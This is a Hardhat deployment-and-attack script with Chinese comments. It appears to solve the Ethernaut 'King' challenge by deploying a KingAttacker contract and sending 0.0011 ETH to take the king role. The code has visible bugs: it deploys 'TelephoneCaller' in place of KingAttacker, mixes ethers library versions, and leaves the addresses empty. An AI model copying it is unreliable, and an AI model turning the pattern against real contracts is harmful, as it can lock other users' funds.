import hre from "hardhat";

// 替換成 King 的合約實例地址
const KING_ADDRESS = "";

const KINGATTACKER_ADDRESS = "";

async function deployKingAttacker() {
    const KingAttacker = await hre.ethers.getContractFactory("KingAttacker");
    const kingAttacker = await TelephoneCaller.deploy(KING_ADDRESS);
    await kingAttacker.waitForDeployment();
    console.log("KingAttacker deployed to: ", await kingAttacker.getAddress());
}

async function main() {
    // 執行一次
    await deployKingAttacker();
    const king = await hre.ethers.getContractAt("King", KING_ADDRESS);
    const kingAttacker = await hre.ethers.getContractAt("KingAttacker", KINGATTACKER_ADDRESS);
    console.log("目前 KING 的 owner 狀態: ", await king.owner());
    console.log("目前 KING 的狀態: ", await king._king());
    console.log("目前 KING 的 prize 狀態: ", await king.prize());
    // 應該是 0.001
    console.log("目前 KING 的餘額狀態: ", await hre.ethers.formatEther(await hre.ethers.provider.getBalance(KING_ADDRESS)), "ETH");

    // 發送代幣到 King
    const value = hre.ethers.utils.parseEther("0.0011");
    console.log("Sending transaction to toKing()...");
    const tx = await kingAttacker.toKing({
         value: value
        });
    // 等待交易確認
    console.log("交易發送中，交易哈希:", tx.hash);
    const receipt = await tx.wait();
    console.log("交易確認，區塊號:", receipt.blockNumber);

    console.log("目前 KING 的 owner 狀態: ", await king.owner());
    console.log("目前 KING 的狀態: ", await king._king());
    console.log("目前 KING 的 prize 狀態: ", await king.prize());

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });